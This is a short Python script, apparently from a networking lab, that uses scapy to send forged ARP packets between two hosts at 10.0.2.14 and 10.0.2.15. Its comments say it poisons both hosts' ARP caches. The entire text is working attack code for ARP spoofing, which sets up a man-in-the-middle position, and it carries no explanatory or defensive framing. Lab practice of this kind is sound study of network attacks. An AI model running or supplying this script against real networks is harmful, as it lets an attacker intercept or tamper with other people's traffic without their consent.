#!/usr/bin/python3
from scapy.all import *

def send_ARP_packet(ip_src,  mac_src, ip_dst, mac_dst):
	E = Ether(src=mac_src, dst=mac_dst)
	A = ARP(hwsrc=mac_src,psrc=ip_src, hwdst=mac_dst, pdst=ip_dst)
	pkt = E/A
	sendp(pkt)

#spoof arp request packet from A --> B and poison B's Cache
send_ARP_packet('10.0.2.15','08:00:27:bb:77:45',
		'10.0.2.14','08:00:27:aa:b1:ad' )

#spoof arp request packet from B --> A and poison A's Cache
send_ARP_packet('10.0.2.14','08:00:27:bb:77:45',
		'10.0.2.15','08:00:27:fd:d5:27')
